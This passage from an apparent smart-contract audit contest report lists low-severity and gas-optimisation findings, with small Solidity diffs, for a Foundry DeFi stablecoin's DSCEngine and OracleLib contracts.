This is an informational finding. The error being thrown can add more information to make it clearer.

## Code Snippet

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L158-L160

## Vulnerability Details

The error being thrown can add more information to make it clearer.

## Impact

Improving the error being thrown can make things clearer for users or developers. 

## Tools Used

Manual Review

## Recommendations

In file `DSCEngine.sol`, these can be fixed:

```diff

...

    error DSCEngine__NotAllowedToken();
-   error DSCEngine__TransferFailed();
+   error DSCEngine__TransferFailed(address token);
    error DSCEngine__BreaksHealthFactor(uint256 healthFactor);
    error DSCEngine__MintFailed();

...

function depositCollateral(address tokenCollateralAddress, uint256 amountCollateral)
        public
        moreThanZero(amountCollateral)
        isAllowedToken(tokenCollateralAddress)
        nonReentrant
    {
        s_collateralDeposited[msg.sender][tokenCollateralAddress] += amountCollateral;
        emit CollateralDeposited(msg.sender, tokenCollateralAddress, amountCollateral);
        bool success = IERC20(tokenCollateralAddress).transferFrom(msg.sender, address(this), amountCollateral); 
        if (!success) {
-            revert DSCEngine__TransferFailed(); // @audit informational - it is better to put token address or the tx sender: msg.sender in the error message. i.e. DSCEngine__TransferFailed(msg.sender, tokenCollateralAddress);
+            revert DSCEngine__TransferFailed(tokenCollateralAddress); // @audit informational - it is better to put token address or the tx sender: msg.sender in the error message. i.e. DSCEngine__TransferFailed(msg.sender, tokenCollateralAddress);
        }
    }
```

```diff
function _burnDsc(uint256 amountDscToBurn, address onBehalfOf, address dscFrom) private {
        s_DSCMinted[onBehalfOf] -= amountDscToBurn;
        bool success = i_dsc.transferFrom(dscFrom, address(this), amountDscToBurn);
        // This conditional is hypothetically unreachable
        if (!success) {
-            revert DSCEngine__TransferFailed();
+            revert DSCEngine__TransferFailed(address(i_dsc));
        }
        i_dsc.burn(amountDscToBurn);
    }
```

```diff
function _redeemCollateral(address from, address to, address tokenCollateralAddress, uint256 amountCollateral)
        private
    {
        s_collateralDeposited[from][tokenCollateralAddress] -= amountCollateral;
        emit CollateralRedeemed(from, to, tokenCollateralAddress, amountCollateral);
        bool success = IERC20(tokenCollateralAddress).transfer(to, amountCollateral);
        if (!success) {
-            revert DSCEngine__TransferFailed();
+            revert DSCEngine__TransferFailed(tokenCollateralAddress);
        }
    }
```
## <a id='G-35'></a>G-35. More documentation is preferred

_Submitted by [0x0115](/profile/clk4scd7q0000l208rpyf7gvh)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L19-L37

## Summary
Code base needs more Natspec comments. Documentation should be consistent and clear for the auditors and devs.

## Vulnerability Details
Code base lacks documentation. 

## Impact
Documentation should be consistent and clear for the auditors and devs.

## Tools Used
Manual review

## Recommendations

```diff
+    /**
+     * @notice This function checks if the latest round data is stale or not.
+     * @dev If the latest round data is stale, the function will revert.
+     * @param priceFeed The Chainlink Oracle price feed.
+     */
    function staleCheckLatestRoundData(AggregatorV3Interface priceFeed) // @audit here if the oracle price is stale, the function will revert, then the system will be unusable. This is not right and we need a plan B in this case.
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
            priceFeed.latestRoundData();
        // @audit also check 1. if the answer is more than 0, and check 2. the current roundId is more than the previous roundId.
        uint256 secondsSince = block.timestamp - updatedAt;
        if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

        return (roundId, answer, startedAt, updatedAt, answeredInRound);
    }

+    /**
+     * @notice This function returns the timeout value for the OracleLib
+     */
    function getTimeout(AggregatorV3Interface /* chainlinkFeed */ ) public pure returns (uint256) {
        return TIMEOUT;
    }
}
```

## <a id='G-36'></a>G-36. Imports could be organized more systematically

_Submitted by [ABA](/profile/clk43rqfo0008mg084q0ema3g), [mau](/profile/clk9v1fgt0008mn08czddr9to). Selected submission by: [mau](/profile/clk9v1fgt0008mn08czddr9to)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L26

## Summary

The contract's interface should be imported first, followed by each of the interfaces it uses, followed by all other files. The examples below do not follow this layout.

## Tools Used

Manual Review

## <a id='G-37'></a>G-37. Unnecessary argument in getTimeout function

_Submitted by [iurii2002](/profile/clkjopcpe0020mb08ev4t85e5), [0xDanielH](/profile/clkkityt00000mj08mr89rdav), [xfu](/profile/clke2oift0000l508j03apihy). Selected submission by: [iurii2002](/profile/clkjopcpe0020mb08ev4t85e5)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L36

## Summary
Unnecessary argument passed to getTimeout function will cost additional gas

## Impact
Around 2200 extra gas will be used for storing unnecessary argument 

```
[PASS] testGetTimeout() (gas: 5532)
[PASS] testGetTimeoutWhitounArgument() (gas: 3352)
```

## Tools Used
Observation, foundry unit test

Functions:
```solidity
    function getTimeout(AggregatorV3Interface /* chainlinkFeed */ ) public pure returns (uint256) {
        return TIMEOUT;
    }

    function getTimeoutWhitounArgument() public pure returns (uint256) {
        return TIMEOUT;
    }
```

Tests:
```solidity
    function testGetTimeout() public {
        uint256 expectedTimeout = 3 hours;
        assertEq(OracleLib.getTimeout(AggregatorV3Interface(address(aggregator))), expectedTimeout);
    }

    function testGetTimeoutWhitounArgument() public {
        uint256 expectedTimeout = 3 hours;
        assertEq(OracleLib.getTimeoutWhitounArgument(), expectedTimeout);
    }
```

## Recommendations
Rewrite function to 
```solidity
    function getTimeoutWhitounArgument() public pure returns (uint256) {
        return TIMEOUT;
    }
```
## <a id='G-38'></a>G-38. Not respecting the Checks-Effects-Interactions pattern that can be a place for bugs

_Submitted by [0xFEll](/profile/clk8yoz9i0000jy080toixh10)._      
				


## Summary
**Potential Reentrancy Attack**: Even though the contract uses a reentrancy guard, it's crucial to ensure that all external calls are at the end of the function (the Checks-Effects-Interactions pattern). In the `liquidate` function, the `_redeemCollateral` function (which makes an external call) is followed by `_burnDsc` which alters the state. This could potentially lead to a reentrancy attack. 

## Vulnerability Details

## Impact

## Tools Used
chaingpt

## Recommendations
Swap the order of _redeemCollateral and _burnDsc on the liquidate function
## <a id='G-39'></a>G-39. >= costs less gas than >

_Submitted by [lwltea](/profile/clk7224p9000ujt08g853wh48), [SAQ](/profile/clkftc56x0006le08usdp7epo). Selected submission by: [SAQ](/profile/clkftc56x0006le08usdp7epo)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/libraries/OracleLib.sol#L30

## Summary

## [G-19] >= costs less gas than >
 
The compiler uses opcodes GT and ISZERO for solidity code that uses >, but only requires LT for >=, which saves 3 gas 
Reference:  https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde

```solidity
file: /src/libraries/OracleLib.sol

30        if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

```
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/libraries/OracleLib.sol#L30
## <a id='G-40'></a>G-40. [L-03] Continues with the standard use for Collateral variable

_Submitted by [kz0213871](/profile/clk9oqssu0008me08w56bq8n4)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L229

## Summary
Throughout the contract when you want to refer to the collateral token address variable, it is referred to as tokenCollateralAddress and only in the liquidate function is it referred to as collateral.

## Impact
Low

## Tools Used
Manual code review

## Recommendations
It is recommended to replace this value with the tokenCollateralAddress to avoid confusion or doubt if the same value is being referenced.
## <a id='G-41'></a>G-41. Wrong comment DecentralizedStableCoin.sol

_Submitted by [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [karanctf](/profile/clk85gz2g0006mw087jgqqicj). Selected submission by: [karanctf](/profile/clk85gz2g0006mw087jgqqicj)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DecentralizedStableCoin.sol#L32

It should be 
```diff
-- * Collateral: Exogenous (ETH & BTC)
++ * Collateral: Exogenous (wETH & wBTC)
```
## <a id='G-42'></a>G-42. Consider disabling renounceOwnership()

_Submitted by [mau](/profile/clk9v1fgt0008mn08czddr9to)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L39

## Summary

If the plan for your project does not include eventually giving up all ownership control, consider overwriting OpenZeppelin's Ownable's renounceOwnership() function in order to disable it.

## Tools Used

Manual Review
## <a id='G-43'></a>G-43. Boolean equality

_Submitted by [crypt0mate](/profile/clk82i8pg0000jo08jat0qepq)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/foundry-defi-stablecoin-f23/blob/main/src/DSCEngine.sol#L238-L240


## Summary
Boolean constants can be used directly and do not need to be compared to true or false.

## Vulnerability Details
`!minted` is more concise and readable than minted != true. The `!minted` expression directly conveys the meaning "if not minted" or "if minted is false," which is much clearer than explicitly comparing minted to true. The latter form, minted != true, adds unnecessary complexity and verbosity to the code.

## Impact
Code Readability

## Tools Used
Manual code inspection

## Recommendations
Change this:
```
if (minted != true) {
    revert DSCEngine__MintFailed();
}
```

to:

```
if (!minted) {
    revert DSCEngine__MintFailed();
}
```



## <a id='G-44'></a>G-44. Amounts should be checked for `0` before calling a `transfer`

_Submitted by [xfu](/profile/clke2oift0000l508j03apihy)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol#L157

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol#L287

## Summary

## Vulnerability Details
According to the fact that EIP-20 [states](https://github.com/ethereum/EIPs/blob/46b9b698815abbfa628cd1097311deee77dd45c5/EIPS/eip-20.md?plain=1#L116) that zero-valued transfers must be accepted.

Checking non-zero transfer values can avoid an expensive external call and save gas.
While this is done at some places, it’s not consistently done in the solution.

**There are `2` instances of this issue:**

- Adding a non-zero-value check for [success = IERC20(tokenCollateralAddress).transferFrom(msg.sender,address(this),amountCollateral)](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol#L157) at the beginning of [DSCEngine.depositCollateral(address,uint256)](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol#L149-L161)

- Adding a non-zero-value check for [success = IERC20(tokenCollateralAddress).transfer(to,amountCollateral)](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol#L287) at the beginning of [DSCEngine.\_redeemCollateral(address,address,address,uint256)](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol#L282-L291)

## Impact

## Tools Used

## Recommendations
Consider adding a non-zero-value check at the beginning of function.

## <a id='G-45'></a>G-45. collateral and debt to cover not validated

_Submitted by [owade](/profile/clk9j4mf20002mi08k4758eni)._      
				


## Summary
In DSCEngine.sol, collateral and debtToCover are not checked if valid in liquidate() function.
## Vulnerability Details
The liquidate function does not revert early if collateral and debtToCover are not valid
## Impact
Gas can be wasted during runtime
## Tools Used
Manual review
## Recommendations
Use the following
```
 function liquidate(address collateral, address user, uint256 debtToCover)
        external
        moreThanZero(debtToCover)
        nonReentrant
    {
        // need to check health factor of the user
        uint256 startingUserHealthFactor = _healthFactor(user);
        if (startingUserHealthFactor >= MIN_HEALTH_FACTOR) {
            revert DSCEngine__HealthFactorOk();
        }
        if(debtToCover > getCollateralBalanceOfUser(user,collateral)){
            revert DSCEngine__ExcessDebtToCover();
        }

        //......
  
    }
```
